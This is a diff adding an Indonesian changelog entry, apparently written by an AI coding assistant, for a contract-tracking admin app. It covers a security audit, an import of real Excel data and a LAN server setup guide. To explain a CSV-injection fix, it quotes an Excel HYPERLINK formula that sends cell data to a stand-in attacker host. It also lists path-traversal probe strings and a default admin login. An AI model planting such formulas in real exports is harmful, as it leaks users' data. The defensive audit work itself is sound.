@@ -3,6 +3,209 @@
 
 ---
 
+## [4.2] — Audit Keamanan, Impor Data Asli & Setup Server — 19 September 2026
+
+### Bagian 1 — Audit Keamanan
+
+User meminta: *"lakukan testing kembali apakah ada bug dan celah keamanan"*.
+
+**3 celah ditemukan & diperbaiki:**
+
+| # | Celah | Tingkat | Perbaikan |
+|---|---|---|---|
+| 1 | Admin bisa **hapus/nonaktifkan akunnya sendiri** → sistem terkunci | 🔴 Kritis | 2 lapis: `canEdit`/`canDelete` menolak diri sendiri + pengaman di halaman Edit |
+| 2 | **CSV injection** pada ekspor laporan | 🔴 Tinggi | Nilai teks berawalan `=` `+` `-` `@` TAB CR diberi apostrof |
+| 3 | Pemeriksaan peran kurang tegas di Status SPK | 🟡 Sedang | Cek peran admin eksplisit |
+
+**Celah 1 — kenapa berbahaya:** kalau Admin menghapus atau menonaktifkan
+akunnya sendiri dan dia satu-satunya Admin, **tidak ada yang bisa masuk lagi**.
+
+**Celah 2 — kenapa berbahaya:** file CSV ini dibuka di **Excel**, dan Excel
+menjalankan sel yang diawali `=` sebagai rumus. Nama pekerjaan seperti
+`=HYPERLINK("http://jahat/?x="&A1,"klik")` bisa mencuri data; pada Excel lama
+rumus DDE bahkan bisa menjalankan perintah.
+
+**Yang sudah aman (diverifikasi, tidak perlu diubah):**
+
+| Area | Hasil |
+|---|---|
+| `.env`, `.env.testing`, `composer.json`, `.git/config`, `phpunit.xml`, `storage/logs/`, `storage/app/backup` via web | **404/403** |
+| Path traversal (`../.env`, `..%2f.env`, `%2e%2e/.env`) | **404** |
+| Semua halaman admin tanpa login | **302** → `/admin/login` |
+| Ekspor CSV tanpa login | **302** |
+| Brute force login | `rateLimit(5)` bawaan Filament |
+| Upload SVG (risiko XSS) | **Tidak diizinkan** (jpg/png/webp/pdf saja) |
+| Mass assignment (`id`, `nilai_retensi` dari form) | **Ditolak** |
+| `spk_id` palsu, kategori palsu, status palsu, nilai negatif | **Semua ditolak** |
+| Direktur menembus lewat Livewire langsung | **Diblokir** |
+
+**Audit paket:** `composer audit` → **0 kerentanan**; `npm audit` → **0 kerentanan**.
+
+**Test keamanan baru:** `tests/Feature/AuditKeamananTest.php` — **22 test**.
+
+> ⚠️ **Batas audit ini.** Tidak ada pemindai otomatis (OWASP ZAP/Burp). Audit
+> berbasis pembacaan kode + pengujian HTTP manual + unit test. Yang belum
+> diuji: penetrasi sungguhan, konfigurasi server produksi.
+
+---
+
+### Bagian 2 — Impor Data Asli dari Excel
+
+Sumber: `docs/file-Excel-perusahaan.xlsx` (11 sheet: "Tagihan BKS" + 10 sheet per-nama).
+
+| Aspek | Hasil |
+|---|---|
+| SPK terimpor | **90** (dari 91 baris valid; 1 duplikat digabung) |
+| Total nilai | **Rp ██.███.███.███** |
+| Mitra | 1 pemberi kerja (PT PLN Batam) + **10 subkon** (per sheet) |
+| Sheet per-nama | Otomatis ditandai **disubkonkan** (32 SPK) |
+| Sheet "Tagihan BKS" | Dikerjakan sendiri (58 SPK) |
+| Data uji lama | **Dihapus** (4 SPK, 4 mitra, 4 uang masuk, 4 uang keluar) |
+| Backup sebelum hapus | ✅ `bks-2026-09-19-043022.sql.gz` |
+
+**Seeder:** `database/seeders/DataSpkAsliSeeder.php` (idempoten — aman dijalankan ulang).
+
+#### 🔴 2 Anomali di Excel yang diperbaiki (MOHON DIPERIKSA)
+
+**1. Rp 460 MILIAR → Rp 460 JUTA**
+
+```
+SPK SPK-CONTOH-A
+"Pekerjaan Pengadaan Portal Otomatis Pembangkit dan Gardu Induk Tersebar"
+
+Di Excel tertulis : ███.███.███.███  (Rp 460 miliar)
+SPK terbesar lain :   592.637.288  (Rp 592 juta)
+Diduga            : kelebihan 3 nol → Rp 460 juta
+```
+
+Kalau angka Excel memang benar, ini SPK luar biasa besar dan perlu
+dikonfirmasi ulang.
+
+**2. Nomor SPK duplikat → digabung**
+
+```
+SPK SPK-CONTOH-B tercatat 2x di sheet CUT
+  baris 18: Rp ███.███.███
+  baris 19: Rp  ██.███.███
+Digabung : Rp 304.781.400
+```
+
+#### ⚠️ Pemetaan yang diasumsikan (perlu ditinjau)
+
+| Field | Asumsi | Alasan |
+|---|---|---|
+| `tanggal_akhir` | `tanggal_spk` + 90 hari | Excel **tidak punya** kolom tanggal akhir |
+| `status_spk` | 2026 → berjalan; sebelum 2026 → selesai | Tidak ada kolom status di Excel |
+| `status_tagihan` | keterangan memuat "sudah" → sudah_ditagihkan | Keterangan seperti "20/7/2026 sudah diantar ke imperium" |
+| Mitra | sheet per-nama = subkon | Sheet dinamai per-orang (CUT, ARIF, dll.) |
+| `persen_retensi` | **Kosong** | Excel tidak menyebutkan retensi |
+
+Hasil: 69 berjalan · 21 selesai · 84 sudah ditagihkan · 6 belum ditagihkan.
+
+#### 🔴 BUG DIPERBAIKI: alarm tenggat palsu
+
+Setelah impor, **67 dari 90 SPK** dianggap "lewat tenggat" — jelas salah.
+
+**Penyebab:** scope `lewatTenggat()` menghitung SEMUA SPK yang tanggal
+akhirnya sudah lewat, termasuk SPK lama yang **sudah selesai**.
+
+**Perbaikan:** scope sekarang hanya berlaku untuk SPK yang **masih berjalan**.
+Ditambah method `sudahSelesai()`.
+
+| | Sebelum | Sesudah |
+|---|---|---|
+| Lewat tenggat | 67 dari 90 ❌ | **46 dari 69 berjalan** ✅ |
+| Mendekati tenggat | — | 4 |
+
+> Bug ini **hanya muncul setelah ada data nyata**. Dengan 4 data uji
+> sebelumnya, tidak terlihat sama sekali.
+
+**BUG NAMA BENTROK (lagi):** `mendekatiTenggat()` (instance) bentrok dengan
+`scopeMendekatiTenggat()` → PHP menolak panggilan statis. Dinamai ulang
+`isMendekatiTenggat()`. Ini **pola yang sama** dengan `dariSpk()` dan
+`disubkonkan()` sebelumnya.
+
+---
+
+### Bagian 3 — Setup Server Lokal (1 PC server, diakses PC lain)
+
+Dokumen baru: **`docs/SETUP-SERVER.md`**
+
+Klarifikasi user: *"setupnya 1 pc untuk jadi server dan bisa digunakan seperti
+biasa jadi pc lain akses lewat jaringan yang sama tetap lokal untuk keamanan
+internal perusahaan"*.
+
+**Isi panduan:**
+
+| Bagian | Isi |
+|---|---|
+| Diagram | Alur PC server → PC/HP lain lewat LAN |
+| Set IP static | 2 cara: di PC (NetworkManager) atau reservasi DHCP router |
+| `.env` produksi | `APP_DEBUG=false` **wajib** — kalau `true`, error menampilkan isi database ke siapa pun |
+| 2 opsi menjalankan | `artisan serve` (uji coba) vs **Nginx + PHP-FPM** (produksi) ⭐ |
+| Firewall | Perintah `ufw` — termasuk batasi hanya dari `192.168.100.0/24` |
+| Backup | Cron `schedule:run` + salin ke media eksternal |
+| Autostart | `systemctl enable` + contoh service systemd |
+| Dari PC lain | Tidak perlu instal apa pun — cukup browser |
+| Keamanan internal | Tabel kondisi + 5 hal yang tetap perlu diperhatikan |
+| Daftar periksa | 10 poin sebelum dipakai kerja |
+| Pemecahan masalah | 7 gejala umum + solusinya |
+
+**Diuji nyata:** server dijalankan `--host=0.0.0.0`, diakses lewat IP LAN
+`192.168.100.134` → **HTTP 200**.
+
+> ⚠️ `artisan serve` **tidak cocok untuk pemakaian bersama** — beberapa
+> pengguna bersamaan bisa saling menghambat. Untuk kerja sehari-hari pakai
+> Nginx + PHP-FPM (Opsi B).
+
+---
+
+### Verifikasi
+
+| Uji | Hasil |
+|---|---|
+| Test suite | ✅ **294 test, 850 assertion** — semua lulus |
+| Pint (PSR-12) | ✅ lolos |
+| Halaman admin (data asli) | ✅ 7 halaman HTTP 200 |
+| Akses via IP LAN | ✅ HTTP 200 |
+| `composer audit` | ✅ 0 kerentanan |
+| `npm audit` | ✅ 0 kerentanan |
+| Data asli terimpor | ✅ 90 SPK, Rp ██.███.███.███ |
+| Scope tenggat | ✅ 46 lewat (dari 69 berjalan), bukan 67 dari 90 |
+
+---
+
+### 🔴 PELAJARAN
+
+1. **Bug logika bisnis hanya muncul dengan data nyata.** Alarm tenggat palsu
+   (67 dari 90) tidak terdeteksi dengan 4 data uji. Impor data asli berfungsi
+   sebagai **uji integrasi** yang tidak bisa digantikan unit test.
+2. **Bug nama bentrok scope vs instance sudah terjadi 3 kali** (`dariSpk`,
+   `disubkonkan`, `mendekatiTenggat`). Pola: method instance dengan nama sama
+   seperti scope → PHP menolak panggilan statis. **Selalu beri awalan `is`**
+   pada method instance yang mirip scope.
+3. **CSV yang dibuka di Excel adalah jalur serangan.** Nilai dari database
+   tidak boleh ditulis mentah — Excel menjalankan sel berawalan `=`.
+4. **Pengaman "jangan kunci diri sendiri" itu wajib** pada sistem dengan
+   peran admin tunggal.
+
+---
+
+### Yang Masih Tersisa
+
+| # | Item | Catatan |
+|---|---|---|
+| 1 | **Periksa 2 anomali Excel** | Nilai Rp 460 M & nomor SPK duplikat |
+| 2 | **Tinjau pemetaan status** | `tanggal_akhir` +90 hari itu asumsi |
+| 3 | **Set IP static + cron** | Ikuti `docs/SETUP-SERVER.md` |
+| 4 | **Ganti password default** | `admin@bks.test` / `password` |
+| 5 | **Uang masuk/keluar masih kosong** | Excel hanya berisi daftar SPK |
+| 6 | Retensi belum diisi | Excel tidak menyebutkan |
+| 7 | Dokumen SPK (BAST, kuitansi) | Masih ditunda |
+| 8 | Pajak (PPN/PPh) | Belum diputuskan |
+
+---
+
 ## [4.1] — Perbaikan Menyeluruh dari Hasil Audit — 19 September 2026
 
 ### Latar Belakang
